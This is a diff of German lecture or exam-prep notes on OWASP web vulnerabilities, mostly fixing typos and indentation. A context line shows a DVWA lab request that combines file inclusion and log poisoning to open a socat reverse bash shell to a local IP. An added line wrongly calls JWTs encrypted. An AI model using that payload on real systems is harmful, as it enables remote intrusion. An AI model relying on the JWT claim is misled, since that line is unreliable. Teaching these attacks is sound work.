@@ -1137,13 +1137,13 @@ A2: Fehlerhafte Kryptographie
     -   Datenbanken
     -   Browser
 -   Angriffsszenarien
-    -   Kreditkartennummer werden in einer Datenbank verschlüsselt
+    -   Kreditkartennummer werden in einer Datenbank unverschlüsselt
         gespeichert
     -   Angreifer können die Kreditkartennummern dann durch eine
         SQL-Injektion direkt im Klartext aus der Datenbank abfragen
     -   Eine Web-Anwendung erzwingt die Verwendung von TLS nicht
 -   Maßnahmen
-    -   Schutzbedarf der zu speichernden ermitteln
+    -   Schutzbedarf der zu speichernden Daten ermitteln
     -   Klassifizieren nach Sensibilität
     -   Sensible Daten nicht unnötig speichern
     -   Netzwerkverkehr auf unsichere Protokolle prüfen
@@ -1156,7 +1156,8 @@ A3: Injektionen
 -   Eine Anwendung ist verwundbar gegen eine Injektionsangriff, wenn sie
     -   Daten, die von Benutzern geliefert werden, nicht validiert,
         filtert oder bereinigt
-    -   Direkt interpretierte statements ohne “escaped” zu werden
+    -   Direkt interpretierte statements verwendet, ohne dass diese
+        “escaped” (= “kontextsensitiv unschädlich gemacht”) werden
     -   Feindselige Daten in den Suchparametern von ORM verwendet
     -   Feindselige Daten diret verwendet oder verkettet
 -   Bedrohung
@@ -1337,7 +1338,7 @@ Gegenmaßnahmen
 -   LIMIT verwenden, damit nicht Massenhaft Datensätze entnommen werden
     können
 
--   Web Application Firewalls e.g. heruasfiltern gefählicher Zeichen wie
+-   Web Application Firewalls e.g. herausfiltern gefählicher Zeichen wie
     e.g.  " ’ oder ;
 
 -   Durchgängige Server-seitige Eingabevalidierung
@@ -1781,7 +1782,7 @@ Authentisierung oder der Sitzungsverwaltung
 -   Beispiele
     -   Anwendung erlaubt brute-force Angriffe
     -   Anwendung verwendet Standardpasswörter oder schwache Passwörter
-    -   Schwache Methode zum wiederherstellen des Zugangs nach
+    -   Schwache Methode zum Wiederherstellen des Zugangs nach
         Passwortverlust
     -   Speichern von Passwörtern im Klartext oder mit schwacher
         Hash-Funktion
@@ -1804,7 +1805,7 @@ Fehlerhaftes Session-Management
 
 -   Bedrohung
     -   Angreifer übernimmt die Sitzung eines authentifizierten Nutzers
-        Ursachen
+-   Ursachen
     -   Zu einfache oder nicht verschlüsselte Passwörter
     -   Angreifer erhält Zugriff auf die Session ID - Keine
         Mehrfaktorauthentifizierung
@@ -1824,7 +1825,7 @@ Fehlerhaftes Session-Management
     -   Schwache Passwörter
 -   Schutz der Session ID
     -   Session-ID nur per SSL übertragen
-    -   Zugriff auf Session-ID durch Clientseitige Skripte unterbinden
+    -   Zugriff auf Session-ID durch clientseitige Skripte unterbinden
     -   Timeout für automatischen Logout setzen
     -   Cookie als “Tracking Mode” für die JSESSIONID konfigurieren
     -   Alle <http-method>-Tags entfernen
@@ -1848,7 +1849,7 @@ Fehlerhaftes Session-Management
     </session-config>
 
 -   Gegenmaßnahmen
-    -   Brute Force durch ausprobieren von Passwörtern durch CAPTCHAs
+    -   Brute Force durch Ausprobieren von Passwörtern durch CAPTCHAs
         verhindern
     -   Schlechte Logout-Funktionalität absichern, indem
         Session-Informationen vollständig gelöscht werden
@@ -1873,7 +1874,7 @@ CI/CD Pipelines ohne deren Gültigkeit zu überprüfen
     -   Router oder andere Geräte prüfen oft nicht auf Signaturen und
         sind leichte Angriffsziele
     -   Solarwinds: Updates mit Schadcode
-    -   Sichere Buildprozesse umgangen und Schadcode eingeschläust
+    -   Sichere Buildprozesse umgangen und Schadcode eingeschleust
 
 Gegenmaßnahmen
 
@@ -1882,14 +1883,14 @@ Gegenmaßnahmen
     stammen
 -   Sicherstellen, dass Werkzeuge zur Überprüfung der Supply-Chain
     eingesetzt werden e.g. OWASP Dependency Check
--   Review Process fÜr Code- und Konfigurationsänderungen
+-   Review Process für Code- und Konfigurationsänderungen
 -   Saubere Trennung, Konfiguration und Zugangssteuerung in der CI/CD
     Pipeline
 -   Serialisierte Daten nur signiert oder verschlüsselt übertragen
 
 Unsichere Deserialisierung
 
-Anwendunge enthäkt serialisierte Objekte/Datenstrukturen e.g. als XML-,
+Anwendunge enthält serialisierte Objekte/Datenstrukturen e.g. als XML-,
 JSON- oder Binär-Dokumente und baut daraus durch Desieralisierung
 entsprechen Objekte/Datenstrukturen wieder neu im eigenen Kontext auf
 
@@ -2068,11 +2069,9 @@ Socat:
     localhost/vulnerabilities/fi/?cmd=socat%20TCP4:172.17.0.1:4444%20EXEC:/bin/bash&page=../../../../../../../../var/log/apache2/access.log
 
 -   Gegenmaßnahmen
-
--   Eingabevalidierung
-
--   Indirekter Zugriff mit Lookup-Tabelle, e.g. einfach einen
-    Switch-case mit den möglichen Files
+    -   Eingabevalidierung
+    -   Indirekter Zugriff mit Lookup-Tabelle, e.g. einfach einen
+        Switch-case mit den möglichen Files
 
 Aufgabe 5: Sichere Programmierung (secure coding) (10 Punkte)
 
@@ -2587,4 +2586,5 @@ Erzeugen und Verwalten von Refresh Tokens Erzeugen von Refresh Token
     -   Abhilfe durch JSON Web Tokens (JWT) als Refresh Token
     -   Zustand ist dann in JWT enthalten
     -   JWT Refresh Token muss nicht auf Server gespeichert werden
-    -   Server prüft JWT Refresh Token mit seinem geheimen Schlüssel
+    -   JWT sind verschlüsselt und mit Schlüssel signiert
+        -   Server prüft JWT Refresh Token mit seinem geheimen Schlüssel
